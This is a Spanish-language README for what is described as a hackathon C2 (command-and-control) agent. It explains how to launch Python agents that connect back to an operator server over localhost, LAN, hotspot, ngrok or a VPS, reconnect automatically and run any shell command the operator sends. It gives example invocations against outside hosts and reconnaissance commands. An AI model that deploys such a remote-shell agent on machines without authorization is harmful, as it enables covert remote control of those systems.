# 🤖 Guía del Agente C2

## Versiones Disponibles

### 1. `agent.py` - Versión Base
Agente básico con configuración hardcoded.

**Uso:**
```bash
# Editar el archivo y cambiar SERVER_HOST
python3 agent.py
```

### 2. `agent_hotspot.py` - Pre-configurado para Hotspot
Configurado para conectarse a `10.42.0.1` (hotspot Linux típico).

**Uso:**
```bash
python3 agent_hotspot.py
```

### 3. `agent_ngrok.py` - Versión Flexible (RECOMENDADO)
Permite especificar servidor desde línea de comandos.

**Uso:**
```bash
# Usando argumentos de línea de comandos
python3 agent_ngrok.py 4.tcp.ngrok.io 15432

# Solo host (usa puerto 4444 por defecto)
python3 agent_ngrok.py 4.tcp.ngrok.io

# Sin argumentos (usa valores por defecto del archivo)
python3 agent_ngrok.py
```

---

## 🌐 Escenarios de Conexión

### Localhost (Pruebas locales)
```bash
python3 agent_ngrok.py 127.0.0.1 4444
```

### Red Local (Mismo WiFi)
```bash
python3 agent_ngrok.py 10.1.83.160 4444
```

### Hotspot
```bash
python3 agent_hotspot.py
# O
python3 agent_ngrok.py 10.42.0.1 4444
```

### ngrok (Internet)
```bash
python3 agent_ngrok.py 4.tcp.ngrok.io 15432
```

### VPS con IP Pública
```bash
python3 agent_ngrok.py 104.248.123.45 4444
```

### VPS con Dominio
```bash
python3 agent_ngrok.py c2.ejemplo.com 4444
```

---

## 🔄 Características del Agente

### Reconexión Automática
El agente intenta reconectarse cada 5 segundos si pierde la conexión.

### Ejecución de Comandos
Ejecuta comandos shell con timeout de 30 segundos.

### Identificación Única
Cada agente genera un ID único al iniciar (ej: `agent-abc123`).

### Información del Sistema
Envía hostname y sistema operativo al registrarse.

---

## 🛠️ Requisitos

- Python 3.6 o superior
- Acceso de red al servidor
- Permisos para ejecutar comandos shell

---

## 📋 Comandos Soportados

El agente ejecuta cualquier comando shell válido:

```bash
# Ejemplos que el operador puede enviar:
whoami
hostname
pwd
ls -la
uname -a
cat /etc/os-release
ps aux
netstat -tuln
```

---

## ⚠️ Notas de Seguridad

- ⚠️ Este agente ejecuta comandos sin restricciones
- ⚠️ Solo usar en entornos autorizados y controlados
- ⚠️ Es un proyecto educativo para el hackathon
- ⚠️ NO usar en sistemas de producción o sin autorización

---

## 🐛 Troubleshooting

### El agente no se conecta

1. **Verifica que el servidor esté corriendo:**
   ```bash
   # En el servidor, verificar:
   ss -tlnp | grep 4444
   ```

2. **Verifica conectividad de red:**
   ```bash
   # Desde el agente:
   ping SERVIDOR_IP
   telnet SERVIDOR_IP 4444
   ```

3. **Verifica firewall:**
   ```bash
   # En el servidor:
   sudo firewall-cmd --list-ports
   # Debe incluir 4444/tcp
   ```

4. **Verifica la URL/IP:**
   - ¿Es correcta la dirección?
   - ¿Cambió la URL de ngrok?
   - ¿Está actualizada?

### El agente se conecta pero no responde

1. **Verifica que lleguen los comandos:**
   - El agente debe mostrar: `[cmd recibido] id=...`

2. **Verifica permisos:**
   - Algunos comandos requieren permisos específicos

3. **Verifica timeout:**
   - Comandos que tardan >30s serán cancelados

---

## 📊 Logs del Agente

El agente muestra estos mensajes:

```
[*] Agente ID: agent-abc123
[*] Intentando conectar a 4.tcp.ngrok.io:15432
[+] ✅ Conectado al servidor como agent-abc123
[cmd recibido] id=def456: whoami
[resultado enviado] id=def456
[!] Servidor cerró la conexión
[*] Reintentando en 5s...
```

---

## 🎯 Para la Demo del Hackathon

**Recomendación:** Usa `agent_ngrok.py`

```bash
# Es flexible y fácil de configurar
python3 agent_ngrok.py URL_DE_NGROK PUERTO_DE_NGROK
```

Ventajas:
✅ No requiere editar código
✅ Fácil de cambiar de servidor
✅ Mejor para demos en vivo
✅ Menos propenso a errores
